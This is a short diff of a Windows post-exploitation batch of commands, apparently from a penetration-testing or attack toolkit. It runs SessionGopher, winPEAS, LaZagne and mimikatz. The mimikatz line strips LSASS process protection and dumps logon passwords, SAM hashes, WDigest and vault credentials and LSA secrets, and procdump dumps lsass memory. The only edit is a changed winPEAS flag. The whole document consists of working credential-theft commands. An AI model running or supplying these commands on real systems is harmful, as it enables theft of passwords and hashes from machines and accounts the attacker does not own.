@@ -1,7 +1,7 @@
 cd C:/blood
 try {Invoke-SessionGopher -Thorough}
 catch {$_}
-./winPEASany_ofs.exe searchall log=winpeas.txt
+./winPEASany_ofs.exe log=winpeas.txt
 ./lazagne.exe all | tee lazagne.txt
 ./mimikatz*/mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
